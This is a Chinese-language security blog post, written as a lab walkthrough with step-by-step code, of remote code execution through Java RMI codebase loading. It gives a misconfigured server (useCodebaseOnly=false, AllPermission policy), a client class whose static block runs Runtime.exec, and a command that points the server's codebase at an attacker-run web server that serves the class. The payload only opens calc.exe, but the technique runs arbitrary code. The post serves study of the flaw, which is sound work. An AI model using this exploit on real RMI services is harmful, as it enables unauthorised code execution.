class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后编译三个java文件，并运行服务端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac *</span><br><span class="line"></span><br><span class="line">java -Djava.rmi.server.hostname=192.168.169.136 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>*注意，第二段命令我是在<code>cmd</code>中运行，如果在<code>powershell</code>中运行需要把-D和java用引号分开，如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -D<span class="string">&quot;java.rmi.server.hostname=192.168.169.136&quot;</span> -D<span class="string">&quot;java.rmi.server.useCodebaseOnly=false&quot;</span> -D<span class="string">&quot;java.security.policy=client.policy&quot;</span> -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>执行后如下图，<code>client.policy</code>文件用于配置协议关闭<code>java.security</code>，</p>
+<p>执行时加上<code>java.rmi.server.useCodebaseOnly=false</code>允许服务端从RMI请求中获取加载<code>codebase</code>，若为<code>true</code>则java虚拟机将只信任预先配置好的<code>codebase</code>。</p>
+<p><code>java.rmi.server.hostname=192.168.168.131</code>为服务端<code>ip</code>，也是客户端要访问的<code>ip</code></p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014155150325.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014155150325.png" alt="image-20231014155150325"></a></p>
+<p>然后编写客户端，根据服务端文件的代码，指定这是一个运算加法的服务端，然后还有个<code>ICalc</code>接口文件，将其和客户端文件一个目录下。</p>
+<p>客户端代码【p神的代码稍微在我环境下有点错误】</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014162311620.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162311620.png" alt="image-20231014162311620"></a></p>
+<p><u>主要是其中<code>Payload</code>这个内部类报错，因为在RMI中类是序列化传递的，如果内部类要被序列化传递，它必须是<code>static</code>的，否则会导致序列化问题。</u></p>
+<blockquote>
+<p><code>内部类不能被序列化！</code></p>
+</blockquote>
+<p>看到它是继承<code>ArrayList</code>，直接用<code>ArrayList</code>即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">-   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">-   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.136:1099/refObj&quot;</span>);</span><br><span class="line">-       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">+       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常运行，发送到服务端，返回<code>3，4</code>相加后的结果<code>7</code></p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014162928158.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162928158.png" alt="image-20231014162928158"></a></p>
+<h3 id="指定codebase"><a href="#指定codebase" class="headerlink" title="指定codebase"></a>指定<code>codebase</code></h3><p>客户端再在<code>RMI</code>中指定<code>codebase</code>，向服务器发送请求，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//example.com/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端先向远程对象发送codebase，并告诉了查询的类名称</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017210721617.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017210721617.png" alt="image-20231017210721617"></a></p>
+<p>发现果然服务端通过客户端发送的<code>codebase</code>信息，到目标网站下进行寻找访问类，<code>User-Agent</code>就是服务端的java虚拟机。</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014165043675.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165043675.png" alt="image-20231014165043675"></a></p>
+<p>最后<code>example.com</code>响应返回404</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014165505720.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165505720.png" alt="image-20231014165505720"></a></p>
+<p>当然这里如果代码和p神一样也是可以的，还可以看到服务端也查找了内部类<code>RMIClient$Payload</code>，只不过客户端最后输出会报错，但是客户端还是成功把<code>codebase</code>发送给了服务端，服务端也在底下寻找内部类</p>
+<blockquote>
+<p>可以从下方返回的数据包的顺序，知道服务器先寻找内部类，再寻找外部类</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014171626991.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014171626991.png" alt="image-20231014171626991"></a></p>
+<h3 id="加载恶意类"><a href="#加载恶意类" class="headerlink" title="加载恶意类"></a>加载恶意类</h3><p>上面的流量分析知道服务端的<code>java</code>虚拟机确实会访问<code>codebase</code>的类文件，所以我们只需要把<code>/RMIClient$Payload.class</code> 改成恶意类即可，当然在<code>RMIClient</code>中写上恶意类也可以，这里以在内部类Payload为例子</p>
+<p>加上恶意类后的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                p.waitFor();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重新编译生成类文件</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javac</span> <span class="regexp">*.java</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>这里遇到一个坑，因为<code>Payload</code>是内部类，其本质还是为<code>RMIClient$Payload</code></p>
+<p>而这里，我将恶意类写在了内部类中，所以最后服务端要执行内部类的静态方法也就是我们的恶意方法，还需要加载外部类<code>RMIClient</code>，所以我们需要将内部类<code>RMIClient$Payload</code>和外部类<code>RMIClient</code>都放在恶意服务器等着服务端加载</p>
+<p>如果将恶意方法写在外部类中，就只有把外部类<code>RMIClient</code>放在恶意服务器上等着服务端加载就可以执行</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
+<p>因为服务端是虚拟机中运行，我直接在物理机用<code>wsl</code>安装<code>apache2</code>上把这两个类文件放上去(为什么放两个类，原因见上)</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017222948310.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017222948310.png" alt="image-20231017222948310"></a></p>
+<p>记得目录必须按照格式需要为包名</p>
+<p>修改上面的<code>example.com</code>为<code>wsl</code>的<code>ip</code>即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//x.x.x.x/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到访问成功，</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017223047942.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223047942.png" alt="image-20231017223047942"></a></p>
+<p>网站也将类的内容返回给java-vm</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017213458878.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017213458878.png" alt="image-20231017213458878"></a></p>
+<p>查看服务端</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017223143987.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223143987.png" alt="image-20231017223143987"></a></p>
+<p>执行成功</p>
+<hr>
+<p>*注意，进行RMI时，客户端接口文件的包名必须和服务器包名必须一样</p>
+<p>如下，在<code>RMI_2</code>包中，我的接口文件的包名也是<code>RMI_2</code>，但是服务端的接口文件包名是<code>RMI_1</code></p>
+<p>客户端：</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193958356.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193958356.png" alt="image-20230921193958356"></a></p>
+<p>服务端：</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193926761.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193926761.png" alt="image-20230921193926761"></a></p>
+<p>报错，</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193717284.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193717284.png" alt="image-20230921193717284"></a></p>
+<blockquote>
+<p>这个异常是由于Java模块化系统引入的。在Java 9及更高版本中，引入了模块化系统，它会对类加载和模块之间的依赖关系进行更严格的控制。这个异常消息表明你<code>正在尝试将一个接口从一个模块加载到另一个模块</code>，而两者之间可能存在访问限制。</p>
+<p>解决这个问题的方法之一是<code>确保你的RMI接口和实现都在相同的模块中</code>，或者在相同的模块路径下。这样，它们将属于同一模块，不会出现模块之间的访问问题。</p>
+</blockquote>
+<p>所以，只客户端只需要导入<code>RMI_1</code>包中的接口，就可以成功访问到服务端。</p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921194236577.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921194236577.png" alt="image-20230921194236577"></a></p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8-RMI-2"><span class="toc-number">1.</span> <span class="toc-text">Java安全[RMI(2)]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BBRMI-Registry"><span class="toc-number">1.1.</span> <span class="toc-text">如何攻击RMI Registry?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%88%A9%E7%94%A8codebase%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">RMI利用codebase执行任意代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-number">1.2.1.</span> <span class="toc-text">环境配置和代码编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9Acodebase"><span class="toc-number">1.2.2.</span> <span class="toc-text">指定codebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">加载恶意类</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&text=Java安全[RMI(2)]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&is_video=false&description=Java安全[RMI(2)]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全[RMI(2)]&body=Check out this article: https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&title=Java安全[RMI(2)]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/Java%E5%AE%89%E5%85%A8[RMI(2)]/&name=Java安全[RMI(2)]&description=&lt;p&gt;从RMI第一篇描述了RMI的通信过程和组成成分，总结一下，一个RMI过程有以下三个参与者：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;RMI Registry&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RMI Server&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RMI Client&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是对于RMI Registry来说，一般在创建时，就直接和服务器端的一个对象进行绑定，所以最后只有Server和Client两部分代码，而Server中就自然包含了Registry和Server两部分：&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;LocateRegistry.createRegistry(&lt;span class=&#34;number&#34;&gt;1099&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Naming.bind(&lt;span class=&#34;string&#34;&gt;&amp;quot;rmi://127.0.0.1:1099/Hello&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;RemoteHelloWorld&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;上述代码中，第一行是创建并运行&lt;code&gt;RMI Registry&lt;/code&gt;，第二行是将&lt;code&gt;RemoteHelloWorld&lt;/code&gt;对象绑定到&lt;code&gt;Hello&lt;/code&gt;这个&lt;code&gt;Name&lt;/code&gt;上。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Naming.bind&lt;/code&gt;的第一个参数是&lt;code&gt;url&lt;/code&gt;，格式为&lt;code&gt;rmi://host:post/name&lt;/code&gt;。这里的&lt;code&gt;host&lt;/code&gt;和&lt;code&gt;post&lt;/code&gt;就是&lt;code&gt;RMI Registry&lt;/code&gt;的地址和端口，&lt;code&gt;name&lt;/code&gt;就是远程对象绑定的名字。&lt;/p&gt;
+&lt;p&gt;不过，如果&lt;code&gt;RMI Registry&lt;/code&gt;在本地运行，那么&lt;code&gt;host&lt;/code&gt;和&lt;code&gt;port&lt;/code&gt;是&lt;u&gt;可以省略&lt;/u&gt;的，&lt;code&gt;host&lt;/code&gt;默认为&lt;code&gt;localhost&lt;/code&gt;，&lt;code&gt;port&lt;/code&gt;默认是&lt;code&gt;1099&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;直接保留&lt;code&gt;name&lt;/code&gt;就行，&lt;/p&gt;
